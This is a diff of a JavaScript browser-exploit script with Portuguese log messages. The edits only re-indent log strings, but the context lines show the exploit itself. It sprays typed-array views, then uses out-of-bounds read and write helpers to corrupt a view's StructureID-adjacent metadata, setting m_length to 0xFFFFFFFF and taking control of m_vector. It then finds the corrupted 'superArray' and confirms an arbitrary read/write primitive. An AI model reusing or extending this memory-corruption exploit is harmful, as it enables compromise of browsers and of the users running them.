@@ -55,7 +55,7 @@ export async function sprayAndInvestigateObjectExposure() {
         logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
         // Linha ~70 (aproximadamente onde o erro foi reportado) - Simplificada para diagnóstico
         const sidForLog = EXPECTED_UINT32ARRAY_STRUCTURE_ID; // Evita chamada de função complexa dentro do log
-        logS3(`   AVISO IMPORTANTE: Usando EXPECTED_UINT32ARRAY_STRUCTURE_ID: ${String(sidForLog)} (Hex: ${toHex(sidForLog)}). ATUALIZE SE CONHECIDO!`, "warn", FNAME_CURRENT_TEST);
+        logS3(`    AVISO IMPORTANTE: Usando EXPECTED_UINT32ARRAY_STRUCTURE_ID: ${String(sidForLog)} (Hex: ${toHex(sidForLog)}). ATUALIZE SE CONHECIDO!`, "warn", FNAME_CURRENT_TEST);
 
 
         // 1. Heap Spraying: Criar VIEWS sobre o oob_array_buffer_real
@@ -63,7 +63,7 @@ export async function sprayAndInvestigateObjectExposure() {
         let current_data_offset_for_view = (OOB_CONFIG.BASE_OFFSET_IN_DV || 0) + 0x200;
         for (let i = 0; i < NUM_SPRAY_VIEWS; i++) {
             if (current_data_offset_for_view + (SPRAY_VIEW_ELEMENT_COUNT * 4) > oob_array_buffer_real.byteLength) {
-                logS3(`   Spray interrompido em ${i} views (fim do oob_array_buffer_real para dados).`, "warn", FNAME_CURRENT_TEST);
+                logS3(`    Spray interrompido em ${i} views (fim do oob_array_buffer_real para dados).`, "warn", FNAME_CURRENT_TEST);
                 break;
             }
             try {
@@ -72,7 +72,7 @@ export async function sprayAndInvestigateObjectExposure() {
                 sprayedVictimViews.push(view);
                 current_data_offset_for_view += SPRAY_VIEW_BYTE_OFFSET_INCREMENT;
             } catch (e_spray) {
-                logS3(`   Erro ao criar view no spray ${i}: ${e_spray.message}`, "error", FNAME_CURRENT_TEST);
+                logS3(`    Erro ao criar view no spray ${i}: ${e_spray.message}`, "error", FNAME_CURRENT_TEST);
                 break;
             }
         }
@@ -86,14 +86,14 @@ export async function sprayAndInvestigateObjectExposure() {
             sid_before_main_corruption = oob_read_absolute(sid_check_offset, 4);
             logS3(`FASE 2: StructureID em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} (offset ${toHex(sid_check_offset)}) ANTES da corrupção de m_vec/m_len: ${toHex(sid_before_main_corruption)}`, "info", FNAME_CURRENT_TEST);
             if (EXPECTED_UINT32ARRAY_STRUCTURE_ID !== (0xBADBAD00 | 33) && sid_before_main_corruption === EXPECTED_UINT32ARRAY_STRUCTURE_ID) { // Só loga se SID esperado for real
-                logS3("    BOA NOTÍCIA: StructureID esperado encontrado ANTES da corrupção principal de m_vec/m_len!", "good", FNAME_CURRENT_TEST);
+                logS3("     BOA NOTÍCIA: StructureID esperado encontrado ANTES da corrupção principal de m_vec/m_len!", "good", FNAME_CURRENT_TEST);
             } else if (sid_before_main_corruption !== 0 && (sid_before_main_corruption & 0xFFFF0000) !== 0xCAFE0000) { // Não é zero nem padrão de preenchimento anterior
-                 logS3(`    AVISO: SID em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} (${toHex(sid_before_main_corruption)}) não é o esperado (${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}).`, "warn", FNAME_CURRENT_TEST);
+                 logS3(`     AVISO: SID em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} (${toHex(sid_before_main_corruption)}) não é o esperado (${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)}).`, "warn", FNAME_CURRENT_TEST);
             } else {
-                 logS3(`    SID em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} é ${toHex(sid_before_main_corruption)} (padrão/zero).`, "info", FNAME_CURRENT_TEST);
+                 logS3(`     SID em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} é ${toHex(sid_before_main_corruption)} (padrão/zero).`, "info", FNAME_CURRENT_TEST);
             }
         } catch (e) {
-            logS3(`   Erro ao ler StructureID pré-corrupção em ${toHex(sid_check_offset)}: ${e.message}`, "error", FNAME_CURRENT_TEST);
+            logS3(`    Erro ao ler StructureID pré-corrupção em ${toHex(sid_check_offset)}: ${e.message}`, "error", FNAME_CURRENT_TEST);
         }
 
         // 3. Plantar valores para m_vector e preparar para corromper m_length
@@ -106,7 +106,7 @@ export async function sprayAndInvestigateObjectExposure() {
         oob_write_absolute(m_vector_addr_in_oob + 8, 0x0, 4); // Zera o que seria o início de m_length/m_mode em 0x70
 
         logS3(`  Valores ANTES da corrupção trigger em 0x70:`, "info", FNAME_CURRENT_TEST);
-        logS3(`    QWORD @${toHex(m_vector_addr_in_oob)} (m_vector): ${oob_read_absolute(m_vector_addr_in_oob, 8).toString(true)} (Esperado: ${toHex(PLANT_MVECTOR_HIGH_PART,32,false)}_${toHex(PLANT_MVECTOR_LOW_PART,32,false)})`, "info", FNAME_CURRENT_TEST);
+        logS3(`     QWORD @${toHex(m_vector_addr_in_oob)} (m_vector): ${oob_read_absolute(m_vector_addr_in_oob, 8).toString(true)} (Esperado: ${toHex(PLANT_MVECTOR_HIGH_PART,32,false)}_${toHex(PLANT_MVECTOR_LOW_PART,32,false)})`, "info", FNAME_CURRENT_TEST);
 
         // 4. Acionar a Corrupção Principal
         logS3(`FASE 3.2: Acionando corrupção em ${toHex(CORRUPTION_OFFSET_TRIGGER)} (0x70) com ${CORRUPTION_VALUE_TRIGGER.toString(true)}...`, "info", FNAME_CURRENT_TEST);
@@ -120,22 +120,22 @@ export async function sprayAndInvestigateObjectExposure() {
         try { abv_vector_after = oob_read_absolute(m_vector_addr_in_oob, 8); } catch(e) {} 
         try { abv_length_after = oob_read_absolute(m_length_addr_in_oob, 4); } catch(e) {} 
             
-        logS3(`    Resultados para metadados em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} APÓS corrupção:`, "info", FNAME_CURRENT_TEST);
-        logS3(`      StructureID: ${toHex(sid_after_final_corruption)} (Antes: ${toHex(sid_before_main_corruption)}, Esperado: ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)})`, "leak", FNAME_CURRENT_TEST);
-        logS3(`      m_vector:    ${isAdvancedInt64Object(abv_vector_after) ? abv_vector_after.toString(true) : "Erro Leitura"} (Controlado para: ${toHex(PLANT_MVECTOR_HIGH_PART,32,false)}_${toHex(PLANT_MVECTOR_LOW_PART,32,false)})`, "leak", FNAME_CURRENT_TEST);
-        logS3(`      m_length:    ${toHex(abv_length_after)} (Decimal: ${abv_length_after}) (Esperado: 0xffffffff)`, "leak", FNAME_CURRENT_TEST);
+        logS3(`     Resultados para metadados em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} APÓS corrupção:`, "info", FNAME_CURRENT_TEST);
+        logS3(`         StructureID: ${toHex(sid_after_final_corruption)} (Antes: ${toHex(sid_before_main_corruption)}, Esperado: ${toHex(EXPECTED_UINT32ARRAY_STRUCTURE_ID)})`, "leak", FNAME_CURRENT_TEST);
+        logS3(`         m_vector:     ${isAdvancedInt64Object(abv_vector_after) ? abv_vector_after.toString(true) : "Erro Leitura"} (Controlado para: ${toHex(PLANT_MVECTOR_HIGH_PART,32,false)}_${toHex(PLANT_MVECTOR_LOW_PART,32,false)})`, "leak", FNAME_CURRENT_TEST);
+        logS3(`         m_length:     ${toHex(abv_length_after)} (Decimal: ${abv_length_after}) (Esperado: 0xffffffff)`, "leak", FNAME_CURRENT_TEST);
 
         if (typeof abv_length_after === 'number' && abv_length_after === 0xFFFFFFFF &&
             isAdvancedInt64Object(abv_vector_after) && abv_vector_after.low() === PLANT_MVECTOR_LOW_PART && abv_vector_after.high() === PLANT_MVECTOR_HIGH_PART) {
-            logS3(`    !!!! SUCESSO !!!! m_length CORROMPIDO para 0xFFFFFFFF e m_vector CONTROLADO para ${abv_vector_after.toString(true)}!`, "vuln", FNAME_CURRENT_TEST);
+            logS3(`     !!!! SUCESSO !!!! m_length CORROMPIDO para 0xFFFFFFFF e m_vector CONTROLADO para ${abv_vector_after.toString(true)}!`, "vuln", FNAME_CURRENT_TEST);
             document.title = `Metadados View Corrompidos! m_vec=${abv_vector_after.toString(true)}`;
 
             if (sid_after_final_corruption === EXPECTED_UINT32ARRAY_STRUCTURE_ID && EXPECTED_UINT32ARRAY_STRUCTURE_ID !== (0xBADBAD00 | 33) ) {
-                logS3("        EXCELENTE: StructureID PÓS-CORRUPÇÃO corresponde ao esperado! Um Uint32Array real foi atingido e seu SID sobreviveu!", "vuln", FNAME_CURRENT_TEST);
+                logS3("             EXCELENTE: StructureID PÓS-CORRUPÇÃO corresponde ao esperado! Um Uint32Array real foi atingido e seu SID sobreviveu!", "vuln", FNAME_CURRENT_TEST);
             }
 
             if (abv_vector_after.isZero()) {
-                logS3("    m_vector é ZERO. Tentando identificar qual objeto JS (View) foi corrompido...", "warn", FNAME_CURRENT_TEST);
+                logS3("     m_vector é ZERO. Tentando identificar qual objeto JS (View) foi corrompido...", "warn", FNAME_CURRENT_TEST);
                 const MARKER_VALUE = 0xABCD1234;
                 const MARKER_TEST_OFFSET_IN_OOB = 0x40; 
                 const MARKER_TEST_INDEX = MARKER_TEST_OFFSET_IN_OOB / 4;
@@ -143,12 +143,12 @@ export async function sprayAndInvestigateObjectExposure() {
                 let original_val_at_marker = 0;
                 try {original_val_at_marker = oob_read_absolute(MARKER_TEST_OFFSET_IN_OOB, 4);} catch(e){}
                 oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB, MARKER_VALUE, 4);
-                logS3(`    Marcador ${toHex(MARKER_VALUE)} escrito em oob_buffer[${toHex(MARKER_TEST_OFFSET_IN_OOB)}] via oob_write.`, "info", FNAME_CURRENT_TEST);
+                logS3(`     Marcador ${toHex(MARKER_VALUE)} escrito em oob_buffer[${toHex(MARKER_TEST_OFFSET_IN_OOB)}] via oob_write.`, "info", FNAME_CURRENT_TEST);
 
                 for (let i = 0; i < sprayedVictimViews.length; i++) {
                     try {
                         if (sprayedVictimViews[i][MARKER_TEST_INDEX] === MARKER_VALUE) {
-                            logS3(`      !!!! SUPER ARRAY (VIEW) ENCONTRADO !!!! sprayedVictimViews[${i}] (marcador de dados inicial: ${toHex(sprayedVictimViews[i][0])})`, "vuln", FNAME_CURRENT_TEST);
+                            logS3(`         !!!! SUPER ARRAY (VIEW) ENCONTRADO !!!! sprayedVictimViews[${i}] (marcador de dados inicial: ${toHex(sprayedVictimViews[i][0])})`, "vuln", FNAME_CURRENT_TEST);
                             superArray = sprayedVictimViews[i];
                             document.title = `SUPER VIEW[${i}] ENCONTRADA!`;
                             
@@ -156,9 +156,9 @@ export async function sprayAndInvestigateObjectExposure() {
                             const sid_index_for_superarray_read = sid_offset_for_superarray_read / 4;
                             if (sid_offset_for_superarray_read % 4 === 0) {
                                 const sid_read_by_superarray = superArray[sid_index_for_superarray_read];
-                                logS3(`        LIDO COM SUPERARRAY: StructureID em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} é ${toHex(sid_read_by_superarray)}`, "leak", FNAME_CURRENT_TEST);
+                                logS3(`             LIDO COM SUPERARRAY: StructureID em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)} é ${toHex(sid_read_by_superarray)}`, "leak", FNAME_CURRENT_TEST);
                                 if (sid_read_by_superarray !== 0 && sid_read_by_superarray === EXPECTED_UINT32ARRAY_STRUCTURE_ID && EXPECTED_UINT32ARRAY_STRUCTURE_ID !== (0xBADBAD00|33)) {
-                                     logS3(`          CONFIRMADO: SID lido pelo superArray corresponde ao SID esperado REAL!`, "vuln", FNAME_CURRENT_TEST);
+                                     logS3(`                 CONFIRMADO: SID lido pelo superArray corresponde ao SID esperado REAL!`, "vuln", FNAME_CURRENT_TEST);
                                 }
                             }
                             break; 
@@ -167,13 +167,13 @@ export async function sprayAndInvestigateObjectExposure() {
                 }
                 try {oob_write_absolute(MARKER_TEST_OFFSET_IN_OOB, original_val_at_marker, 4); } catch(e){}
                 if (superArray) {
-                    logS3("    Primitiva de Leitura/Escrita Arbitrária (sobre oob_buffer) via 'superArray' (View) confirmada!", "vuln", FNAME_CURRENT_TEST);
+                    logS3("     Primitiva de Leitura/Escrita Arbitrária (sobre oob_buffer) via 'superArray' (View) confirmada!", "vuln", FNAME_CURRENT_TEST);
                 } else {
-                    logS3("    Não foi possível identificar a 'superArray' (View) específica via teste de marcador.", "warn", FNAME_CURRENT_TEST);
+                    logS3("     Não foi possível identificar a 'superArray' (View) específica via teste de marcador.", "warn", FNAME_CURRENT_TEST);
                 }
             }
         } else {
-            logS3(`    Falha em corromper m_length ou controlar m_vector como esperado em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)}.`, "error", FNAME_CURRENT_TEST);
+            logS3(`     Falha em corromper m_length ou controlar m_vector como esperado em ${toHex(TARGET_VIEW_METADATA_OFFSET_IN_OOB)}.`, "error", FNAME_CURRENT_TEST);
         }
         logS3("INVESTIGAÇÃO DETALHADA COM SPRAY CONCLUÍDA.", "test", FNAME_CURRENT_TEST);
 
